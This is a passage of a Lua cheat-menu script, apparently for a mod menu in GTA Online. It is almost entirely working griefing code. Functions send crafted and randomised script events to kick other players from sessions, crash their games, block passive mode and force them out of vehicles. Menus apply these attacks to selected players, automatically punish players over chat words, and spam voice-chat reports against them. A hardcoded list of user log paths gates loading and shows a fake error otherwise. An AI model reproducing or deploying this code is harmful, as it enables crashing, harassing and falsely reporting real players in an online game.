        util.trigger_script_event(1 << pid, {823645419, pid, -1, -1, -1, -1})
        util.trigger_script_event(
            1 << pid,
            {
                1070934291,
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        util.trigger_script_event(1 << pid, {-442306200, -1, 0})
        util.yield()
    end
end
function KickV10(pid, a1)
    for U = 1, a1 do
        for U, a2 in ipairs(a8) do
            arg = math.random(461950868, 999999999)
            local a4 = {pid, -1139568479, math.random(0, 4), math.random(0, 1)}
            for U = 5, 13 do
                a4[U] = math.random(-2147483647, 2147483647)
            end
            a4[10] = pid
            send_script_event(a2, pid, a4)
            util.yield()
        end
    end
end
function NetKick4(pid)
    for U = 1, #_ do
        par1 = d[math.random(1, #d)]
        par2 = d[math.random(1, #d)]
        par3 = d[math.random(1, #d)]
        par4 = d[math.random(1, #d)]
        par5 = d[math.random(1, #d)]
        send_script_event(_[U], pid, {pid, par3, par1, par4, par3, par1, par5, par4, par1})
        util.yield()
    end
end
function KickV2(pid, a1)
    for U = 1, a1 do
        send_script_event(1620254541, pid, {-32190, -71399, 19031, 85474, 4468, -2112})
        send_script_event(-1789621123, pid, {-1000000, -10000000, -100000000, -100000000, -100000000})
        send_script_event(1294893057, pid, {14, 20, 22, -67, 33, -10})
        send_script_event(1129105265, pid, {28, -1, -1})
        send_script_event(-1243454584, pid, {28, -1, -1})
        send_script_event(-345371965, pid, {28, -1, -1})
        send_script_event(-920663435, pid, {-1000000, -10000, -100000000})
        send_script_event(-72590627, pid, {-38, -30, -75, -59, 85, 82})
        send_script_event(1430093873, pid, {28, -1, -1})
        send_script_event(
            -87967637,
            pid,
            {
                90734864,
                -79797364,
                -19940186,
                -56109619,
                -42346192,
                94232178,
                -30041504,
                -70703125,
                63098145,
                12066650,
                56524658,
                -78369141,
                13214111,
                -69244385,
                -57812500,
                92993165,
                -46472168,
                -71722412
            }
        )
        send_script_event(-891346918, pid, {28, -1, -1})
        send_script_event(-442306200, pid, {-1, 0})
        send_script_event(1119498954, pid, {8477783, 96960450})
        send_script_event(1213808185, pid, {28, -1, -1})
        send_script_event(858406863, pid, {28, -1, -1})
        send_script_event(550741583, pid, {-1, 1, -1, -1, 1, -1, 1, -1, -10000, 0})
        send_script_event(1317868303, pid, {-1000000, -10000000, -100000000, -100000000, -100000000})
        send_script_event(1347850743, pid, {-1, 0})
        send_script_event(-2065346036, pid, {28, -1, -1})
        send_script_event(-1549630786, pid, {28, -1, -1})
        send_script_event(-1990292823, pid, {28, -1, -1})
        send_script_event(-338399516, pid, {-1000000, -10000000, -100000000, -100000000, -100000000})
        send_script_event(823645419, pid, {-1, 6, -1, -1, 6, -1, 6, -1, -10000, 0})
        send_script_event(1070934291, pid, {28, -1, -1})
        send_script_event(1240585650, pid, {-1, 0})
        send_script_event(-1212832151, pid, {-1, 10178, 0, 48, 0, 0, 0, 0, 0, 0})
        send_script_event(1428412924, pid, {28, -1, -1})
        send_script_event(1998625272, pid, {28, -1, -1})
        send_script_event(620255745, pid, {28, -1, -1})
        send_script_event(1977655521, pid, {-1000000, -10000, -100000000})
        send_script_event(1045342179, pid, {-1, 6, -1, -1, 6, -1, 6, -1, -10000, 0})
        send_script_event(-1990292823, pid, {-1, 0})
        send_script_event(830707189, pid, {-1, 0, -1, -1, 6, -1, 6, -1, -10000, 0})
        send_script_event(1000351374, pid, {-1, 1, -1, -1, 1, -1, 1, -1, -10000, 0})
        send_script_event(-171207973, pid, {28, -1, -1})
        send_script_event(1119498954, pid, {8477783, 96960450})
        send_script_event(-2042143896, pid, {94732666, 30853272, -79370118, -16662598})
        send_script_event(-1729804184, pid, {31689453, 91436768, 9588623, -50805664, -10510254})
        send_script_event(-1054826273, pid, {-33111572, -28521729, -7891846})
        send_script_event(-966559987, pid, {18707275, 55963135, 20806885, 56512451, -21520996})
        send_script_event(348119077, pid, {-1, -1, -1, -1, -1, -1})
        send_script_event(-545396442, pid, {71398926, -88073731, -1824951, 26403809, 49438477})
        send_script_event(1881968783, pid, {-61907959, 98449708, -25860596, 5969238, 46203614})
        send_script_event(665709549, pid, {-7946777, 69866944, -76568604, -22979736})
        send_script_event(1401831542, pid, {62438965, 11663818, 31390381, 76538086, 8465576})
        send_script_event(2017765964, pid, {55999756, 54260254})
        send_script_event(-961190199, pid, {6329346, 73571778, 71569825, -41625977})
        send_script_event(1437305856, pid, {88067627, -10833740, -37829590, -85064698, 39263916, 24578858})
        send_script_event(-1252906024, pid, {-1})
        send_script_event(-1890951223, pid, {-1})
        send_script_event(-1559754940, pid, {50531006})
        send_script_event(
            127054992,
            pid,
            {
                -84716797,
                77111817,
                -62121582,
                -75842286,
                -62390137,
                46289063,
                -24603272,
                15899658,
                -68865967,
                14544678,
                -41094971,
                -3723145,
                10235596,
                77917481,
                -17199707
            }
        )
        send_script_event(1119498954, pid, {-7586670, -92486573, -71978760})
        send_script_event(
            4123759323,
            pid,
            {
                -49456787,
                -71105957,
                -99676514,
                -87799073,
                61242676,
                70520020,
                -57885742,
                -76879883,
                10638428,
                -97149659,
                -77246094,
                -9100342,
                50439453,
                37225342,
                8685303,
                -85223389,
                -12658691,
                -59613037,
                39239502,
                -41931153,
                -12664795,
                -53515625,
                15570068,
                6512451,
                25732422,
                -67962647,
                823975,
                92602540,
                39147949,
                84954834
            }
        )
        util.yield(10)
    end
end
function CEOSpam(pid)
    for U = 1, #a do
        util.trigger_script_event(1 << pid, {0xD3FE818F, 0, 1, 5, 0})
        util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 5})
        util.trigger_script_event(1 << pid, {0x9DB77399, 1, 1, 6})
        util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 6, 0})
        util.yield()
    end
end
function NetSpam(pid)
    for U = 1, #d do
        util.trigger_script_event(1 << pid, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
        util.trigger_script_event(1 << pid, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
        util.trigger_script_event(
            1 << pid,
            {
                0x9DB77399,
                50,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                999999999999999,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            }
        )
        util.trigger_script_event(
            1 << pid,
            {
                0x9DB77399,
                50,
                50,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                999999999999999,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            }
        )
        util.trigger_script_event(1 << pid, {0xB0886E20, -1, 0, 0, 0})
        util.trigger_script_event(1 << pid, {0xB0886E20, 0, -1, -1, 0})
        util.trigger_script_event(1 << pid, {0x9DB77399, -1, 0, -1, 0})
        util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 5})
        util.trigger_script_event(1 << pid, {0xD3FE818F, 0, 1, 5, 0})
        util.trigger_script_event(1 << pid, {0x9DB77399, 1, 1, 6})
        util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 6, 0})
        util.yield()
    end
end
function EventSpam(pid, a9)
    for U = 1, #d do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        par6 = math.random(9999999999, 9999999899990868)
        par7 = math.random(1212, 873657283)
        par8 = math.random(-5438747611, 5873626472382)
        util.trigger_script_event(
            1 << pid,
            {
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1
            }
        )
        util.trigger_script_event(
            1 << pid,
            {
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1
            }
        )
        util.trigger_script_event(
            1 << pid,
            {
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1
            }
        )
        util.trigger_script_event(
            1 << pid,
            {
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1
            }
        )
        util.trigger_script_event(
            1 << pid,
            {
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1,
                pid,
                par7,
                par6,
                par5,
                par2,
                par3,
                par4,
                par8,
                par3,
                par1
            }
        )
        if U > 700 then
            U = 1
        end
        util.yield()
    end
end
function Kick1Type1(pid)
    for U = 1, #a do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-1, 9)
        par3 = math.random(-1, 1)
        par4 = math.random(-1, 9)
        par5 = math.random(-1, 1)
        send_script_event(a[U], pid, {pid, par4, par5, par2, par3, par2})
        util.yield()
    end
end
function Kick1Type2(pid)
    for U = 1, #a do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        par6 = math.random(9999999999, 9999999899990868)
        send_script_event(a[U], pid, {pid, par3, pid, par5, par2, par3, par4, par1, par3, par1})
        if U > 363 then
            U = 1
        end
        util.yield()
    end
end
function Kick1Type3(pid)
    for U = 1, #a do
        par1 = d[math.random(1, #d)]
        par2 = d[math.random(1, #d)]
        par3 = d[math.random(1, #d)]
        par4 = d[math.random(1, #d)]
        par5 = d[math.random(1, #d)]
        par6 = d[math.random(1, #d)]
        send_script_event(a[U], pid, {pid, par1, par2, par3, par4, par5, par6, par4, par2})
        if U > 363 then
            U = 1
        end
        util.yield()
    end
end
function Kick2Type1(pid)
    for U = 1, #b do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-1, 9)
        par3 = math.random(-1, 1)
        par4 = math.random(-1, 9)
        par5 = math.random(-1, 1)
        send_script_event(b[U], pid, {pid, par3, par5, par2, par3, par2, par4})
        if U > 713 then
            U = 1
        end
        util.yield()
    end
end
function Kick2Type2(pid)
    for U = 1, #b do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        send_script_event(b[U], pid, {pid, par3, par5, par2, par3, par2, par4, par3, par1})
        if U > 713 then
            U = 1
        end
        util.yield()
    end
end
function Kick2Type3(pid)
    for U = 1, #b do
        par1 = math.random(104574922, 9999999999)
        par2 = math.random(-99999999999999, -1)
        par3 = math.random(461908681885, 99999999999999)
        par4 = math.random(-999999999999, -1)
        par5 = math.random(9999999999999, 46190868453454)
        send_script_event(
            b[U],
            pid,
            {pid, par4, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1}
        )
        if U > 713 then
            U = 1
        end
        util.yield()
    end
end
function Kick3Type1(pid)
    for U = 1, #c do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-1, 9)
        par3 = math.random(-1, 1)
        par4 = math.random(-1, 9)
        par5 = math.random(-1, 1)
        send_script_event(c[U], pid, {pid, par4, par5, par2, par3, par2})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick3Type2(pid)
    for U = 1, #c do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        send_script_event(c[U], pid, {pid, par3, par5, par2, par3, par4, par1, par3, par1})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick3Type3(pid)
    for U, a2 in ipairs(c) do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        send_script_event(a2, pid, {pid, -1, par4, par5, par2, par3, -1, par2, par1, par3, par1})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick4Type1(pid)
    for U, a2 in ipairs(d) do
        par1 = d[math.random(1, #d)]
        par2 = d[math.random(1, #d)]
        par3 = d[math.random(1, #d)]
        par4 = d[math.random(1, #d)]
        par5 = d[math.random(1, #d)]
        util.trigger_script_event(1 << pid, {a2, pid, c[U], par5, par2, par3, par2})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick4Type2(pid)
    for U, a2 in ipairs(d) do
        par1 = d[math.random(1, #d)]
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        util.trigger_script_event(1 << pid, {d[U], pid, c[U], par5, par2, par3, par4, par1, par3, par1})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick4Type3(pid)
    for U, a2 in ipairs(d) do
        par1 = math.random(104574922, 9999999999)
        par2 = math.random(-99999999999999, -1)
        par3 = d[math.random(1, #d)]
        par4 = math.random(-999999999999, -1)
        par5 = math.random(9999999999999, 46190868453454)
        util.trigger_script_event(1 << pid, {d[U], pid, -1, c[U], par5, par2, -1, par2, par1, par3, par1})
        if U > 947 then
            U = 1
        end
        util.yield()
    end
end
function Kick6Type1(pid)
    for U = 1, #e do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-1, 9)
        par3 = math.random(-1, 1)
        par4 = math.random(-1, 9)
        par5 = math.random(-1, 1)
        send_script_event(e[U], pid, {pid, par4, par5, par2, par3, par2})
        util.yield()
    end
end
function Kick6Type2(pid)
    for U = 1, #e do
        par1 = math.random(-1000, 99999999)
        par2 = math.random(-99999999999999, -9)
        par3 = math.random(46190868, 999999999)
        par4 = math.random(-1, 9)
        par5 = math.random(-99999999999999, -46190868)
        par6 = math.random(9999999999, 9999999899990868)
        send_script_event(e[U], pid, {pid, par3, pid, par5, par2, par3, par4, par1, par3, par1})
        util.yield()
    end
end
function Kick6Type3(pid)
    for U = 1, #e do
        par1 = d[math.random(1, #d)]
        par2 = d[math.random(1, #d)]
        par3 = d[math.random(1, #d)]
        par4 = d[math.random(1, #d)]
        par5 = d[math.random(1, #d)]
        par6 = d[math.random(1, #d)]
        send_script_event(e[U], pid, {pid, par3, par5, par4, par3, par2, par1, par3, par1})
        util.yield()
    end
end
function VehKickSpam(pid)
    for U = 1, #d do
        send_script_event(0xB0886E20, pid, {0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
        util.yield()
    end
end
selectedplayer = {}
for aa = 0, 32 do
    selectedplayer[aa] = false
end
excludeselected = false
function list_players(ab)
    for pids = 0, 32 do
        if players.exists(pids) then
            menu.toggle(
                ab,
                tostring(PLAYER.GET_PLAYER_NAME(pids)),
                {},
                "",
                function(ac)
                    if ac then
                        selectedplayer[pids] = true
                    else
                        selectedplayer[pids] = false
                    end
                end
            )
        end
    end
end
function notification(ad, ae, af)
    if ae then
        util.toast("[Tox1cEssent1als] " .. tostring(ad), TOAST_LOGGER)
    end
    if af then
        util.toast(tostring(ad), TOAST_ABOVE_MAP)
    end
end
cmd_id = {}
for ag = 0, 32 do
    cmd_id[ag] = 0
end
local ah = {}
chatloaddata = o .. "\\data\\ChatJudge\\ChatJudge.data"
function chatload()
    if not filesystem.exists(chatloaddata) then
        return
    end
    for B in io.lines(chatloaddata) do
        ah[#ah + 1] = B
    end
end
chatload()
local ai = {}
chatloaddata2 = o .. "\\data\\ChatJudge\\ChatJudge2.data"
function chatload2()
    if not filesystem.exists(chatloaddata2) then
        return
    end
    for B in io.lines(chatloaddata2) do
        ai[#ai + 1] = B
    end
end
chatload2()
local aj = {}
chatloaddata3 = o .. "\\data\\ChatJudge\\ChatJudge3.data"
function chatload3()
    if not filesystem.exists(chatloaddata3) then
        return
    end
    for B in io.lines(chatloaddata3) do
        aj[#aj + 1] = B
    end
end
chatload3()
chatdata_id = {}
for ag = 1, #ah do
    chatdata_id[ag] = 0
end
chatdata_id2 = {}
for ag = 1, #ai do
    chatdata_id2[ag] = 0
end
chatdata_id3 = {}
for ag = 1, #aj do
    chatdata_id3[ag] = 0
end
attachspam = {}
for ag = 0, 32 do
    attachspam[ag] = 0
end
local ak = true
local al, am, an, ao, ap, aq
local ar, as = true, false
local at = {
    "C:/Users/Administrator/AppData/Roaming/Stand/Log.txt",
    "C:/Users/kingt/AppData/Roaming/Stand/Log.txt",
    "C:/Users/huiro/AppData/Roaming/Stand/Log.txt",
    "C:/Users/sherb/AppData/Roaming/Stand/Log.txt",
    "C:/Users/lsh90/AppData/Roaming/Stand/Log.txt",
    "C:/Users/PC/AppData/Roaming/Stand/Log.txt",
    "C:/Users/Ish90/AppData/Roaming/Stand/Log.txt",
    "C:/Users/ZHYCHM/AppData/Roaming/Stand/Log.txt",
    "C:/Users/Matil/AppData/Roaming/Stand/Log.txt",
    "C:/Users/denis/AppData/Roaming/Stand/Log.txt",
    "C:/Users/pedro/AppData/Roaming/Stand/Log.txt"
}
local au, av
function check()
    au = true
    for U = 1, #at do
        if filesystem.exists(at[U]) then
            au = true
            av = U
            notification("Loaded successfully | Made by pnn#1488", true, true)
        end
    end
end
check()
if au == false then
    util.toast(
        "...\\AppData\\Roaming\\Stand\\Lua Scripts\\" ..
            SCRIPT_NAME .. ".lua:1488: Invalid command id " .. math.random(38, 41),
        TOAST_LOGGER | TOAST_ABOVE_MAP
    )
end
util.toast("Nineteen Sinicization, q group number 1139213055")
local aw = {
    "money drop",
    "drop money",
    "pls money",
    "money pls",
    "pls drop",
    "drop pls",
    "money modder",
    "modder money",
    "please money",
    "money please",
    "drop please",
    "please drop",
    "can i have some money",
    "modder pls",
    "pls modder",
    "drop now"
}
local ax = {"adder", "zentorno"}
local ay = {
    "adder",
    "zentorno",
    "buzzard",
    "bullet",
    "frogger",
    "blista",
    "cargobob",
    "dinghy",
    "dilettante",
    "asterope",
    "banshee",
    "krieger",
    "insurgent2",
    "patriot2",
    "starling",
    "nimbus",
    "bus",
    "titan",
    "shamal",
    "luxor",
    "duster",
    "molotok",
    "bombushka",
    "xls2",
    "zorusso",
    "jetmax",
    "dump",
    "kosatka",
    "cargoplane",
    "stockade",
    "rhino"
}
local az = {
    "volatol",
    "bombushka",
    "kosatka",
    "cargoplane",
    "alkonost",
    "rhino",
    "blimp",
    "blimp2",
    "bus",
    "jet",
    "luxor2"
}
local aA = {"volatol"}
local aB = {"bombushka"}
local aC = {"kosatka"}
local aD = {"cargoplane"}
local aE = {"alkonost"}
local aF = {
    "luxor",
    "alphaz1",
    "avenger",
    "besra",
    "blimp",
    "blimp2",
    "cuban800",
    "dodo",
    "duster",
    "howard",
    "hydra",
    "jet",
    "lazer",
    "luxor2",
    "mammatus",
    "mijet",
    "molotok",
    "nokota",
    "pyro",
    "shamal"
}
local aG, aH, aI = false, false, false
local aJ, aK, aL = false, true, 100
function checkexists()
    if filesystem.exists(chatloaddata) then
        aG = true
    end
    if filesystem.exists(chatloaddata2) then
        aH = true
    end
    if filesystem.exists(chatloaddata3) then
        aI = true
    end
end
checkexists()
if au then
    custselc =
        menu.list(
        menu.my_root(),
        "Custom Options",
        {},
        "",
        function()
        end
    )
    menu.toggle(
        custselc,
        "Exclude selected items",
        {},
        "",
        function(ac)
            if ac then
                excludeselected = true
            else
                excludeselected = false
            end
        end
    )
    menu.divider(custselc, "action")
    menu.action(
        custselc,
        "Kick",
        {},
        "",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        if players.user() == players.get_host() then
                            notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                            menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
                        else
                            KickV1(pids, 2)
                            KickV2(pids, 2)
                            notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                        end
                        util.yield()
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        if players.user() == players.get_host() then
                            notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                            menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
                        else
                            KickV1(pids, 2)
                            KickV2(pids, 2)
                            notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                        end
                        util.yield()
                    end
                end
            end
        end
    )
    menu.action(
        custselc,
        "Disable voice chat",
        {},
        "May lag your game when in progress",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        for U = 1, 30 do
                            menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
                            menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
                            util.yield()
                        end
                        notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        for U = 1, 30 do
                            menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
                            menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
                            util.yield()
                        end
                        notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                end
            end
        end
    )
    menu.action(
        custselc,
        "Disable passive mode",
        {},
        "",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        send_script_event(-909357184, pids, {pids, 1})
                        send_script_event(-909357184, pids, {pids, 1})
                        util.yield()
                        notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        send_script_event(-909357184, pids, {pids, 1})
                        send_script_event(-909357184, pids, {pids, 1})
                        util.yield()
                        notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                end
            end
        end
    )
    menu.action(
        custselc,
        "kick out the vehicle",
        {},
        "",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        local Q = PLAYER.GET_PLAYER_PED(pids)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(Q)
                        util.trigger_script_event(1 << pids, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
                        notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        local Q = PLAYER.GET_PLAYER_PED(pids)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(Q)
                        util.trigger_script_event(1 << pids, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
                        notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                end
            end
        end
    )
    menu.action(
        custselc,
        "kick out CEO",
        {},
        "",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        send_script_event(0xD3FE818F, pids, {0, 1, 5, 0})
                        send_script_event(0x9DB77399, pids, {0, 1, 5})
                        send_script_event(0x9DB77399, pids, {1, 1, 6})
                        send_script_event(0x9DB77399, pids, {0, 1, 6, 0})
                        notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        send_script_event(0xD3FE818F, pids, {0, 1, 5, 0})
                        send_script_event(0x9DB77399, pids, {0, 1, 5})
                        send_script_event(0x9DB77399, pids, {1, 1, 6})
                        send_script_event(0x9DB77399, pids, {0, 1, 6, 0})
                        notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    end
                end
            end
        end
    )
    menu.action(
        custselc,
        "collapse",
        {},
        "",
        function()
            for pids = 0, 32 do
                if excludeselected then
                    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                        EventArray(pids, 120, -1949011582)
                        Crash(pids)
                        notification(
                            "Array Crash V1 & Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids),
                            true,
                            false
                        )
                    end
                else
                    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                        EventArray(pids, 120, -1949011582)
                        Crash(pids)
                        notification(
                            "Array Crash V1 & Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids),
                            true,
                            false
                        )
                    end
                end
            end
        end
    )
    menu.divider(custselc, "player list")
    for pids = 0, 32 do
        if players.exists(pids) then
            cmd_id[pids] =
                menu.toggle(
                custselc,
                tostring(PLAYER.GET_PLAYER_NAME(pids)),
                {},
                "PID - " .. pids,
                function(ac)
                    if ac then
                        selectedplayer[pids] = true
                    else
                        selectedplayer[pids] = false
                    end
                end
            )
        end
    end
    chatjudge =
        menu.list(
        menu.my_root(),
        "Chat settings",
        {},
        "",
        function()
        end
    )
    menu.toggle(
        chatjudge,
        "enable",
        {},
        "Enable chat judgment function (main switch)",
        function(ac)
            if ac then
                ak = true
            else
                ak = false
            end
        end,
        true
    )
    menu.divider(chatjudge, "Money Beggers")
    menu.toggle(
        chatjudge,
        "Kick",
        {},
        "",
        function(ac)
            if ac then
                as = true
            else
                as = false
            end
        end,
        false
    )
    menu.toggle(
        chatjudge,
        "collapse",
        {},
        "",
        function(ac)
            if ac then
                ar = true
            else
                ar = false
            end
        end,
        true
    )
    menu.divider(chatjudge, "Custom")
    chatlist1 =
        menu.list(
        chatjudge,
        "list 1",
        {},
        "",
        function()
        end
    )
    chatlist2 =
        menu.list(
        chatjudge,
        "list 2",
        {},
        "",
        function()
        end
    )
    chatlist3 =
        menu.list(
        chatjudge,
        "list 3",
        {},
        "",
        function()
        end
    )
    if aG then
        menu.toggle(
            chatlist1,
            "Kick",
            {},
            "",
            function(ac)
                if ac then
                    am = true
                else
                    am = false
                end
            end
        )
        menu.toggle(
            chatlist1,
            "collapse",
            {},
            "",
            function(ac)
                if ac then
                    al = true
                else
                    al = false
                end
            end
        )
        menu.action(
            chatlist1,
            "Update List",
            {},
            "Reload the script to update the list",
            function(aM)
                notification("Reload the script to update Chat Judge list", true, true)
            end
        )
        menu.divider(chatlist1, "Banned Words")
        for U = 1, #ah do
            chatdata_id[U] =
                menu.action(
                chatlist1,
                tostring(ah[U]),
                {},
                "ID - " .. tostring(U),
                function()
                end
            )
        end
    else
        menu.action(
            chatlist1,
            "Failed to find ChatJudge.data",
            {},
            "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge.data",
            function(aM)
                notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge.data", true, true)
            end
        )
    end
    if aH then
        menu.toggle(
            chatlist2,
            "Kick",
            {},
            "",
            function(ac)
                if ac then
                    ao = true
                else
                    ao = false
                end
            end
        )
        menu.toggle(
            chatlist2,
            "collapse",
            {},
            "",
            function(ac)
                if ac then
                    an = true
                else
                    an = false
                end
            end
        )
        menu.action(
            chatlist2,
            "Update List",
            {},
            "Reload the script to update the list",
            function(aM)
                notification("Reload the script to update Chat Judge list", true, true)
            end
        )
        menu.divider(chatlist2, "Banned Words")
        for U = 1, #ai do
            chatdata_id2[U] =
                menu.action(
                chatlist2,
                tostring(ai[U]),
                {},
                "ID - " .. tostring(U),
                function()
                end
            )
        end
    else
        menu.action(
            chatlist2,
            "Failed to find ChatJudge2.data",
            {},
            "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge2.data",
            function(aM)
                notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge2.data", true, true)
            end
        )
    end
    if aI then
        menu.toggle(
            chatlist3,
            "Kick",
            {},
            "",
            function(ac)
                if ac then
                    kickdtc3 = true
                else
                    kickdtc3 = false
                end
            end
        )
        menu.toggle(
            chatlist3,
            "collapse",
            {},
            "",
            function(ac)
                if ac then
                    ap = true
                else
                    ap = false
                end
            end
        )
        menu.action(
            chatlist3,
            "Update List",
            {},
            "Reload the script to update the list",
            function(aM)
                notification("Reload the script to update Chat Judge list", true, true)
            end
        )
        menu.divider(chatlist3, "Banned Words")
        for U = 1, #aj do
            chatdata_id3[U] =
                menu.action(
